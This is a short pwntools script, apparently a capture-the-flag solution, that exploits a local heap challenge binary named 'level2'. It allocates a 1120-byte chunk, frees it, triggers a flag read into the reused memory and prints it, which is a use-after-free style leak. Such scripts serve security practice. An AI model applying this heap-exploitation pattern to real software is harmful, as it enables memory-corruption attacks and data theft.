from pwn import *
r = process("./level2")
r.read()
r.sendline("malloc")
r.sendline("1120")
r.sendline("free")
r.sendline("read_flag")
r.sendline("puts")
r.interactive()
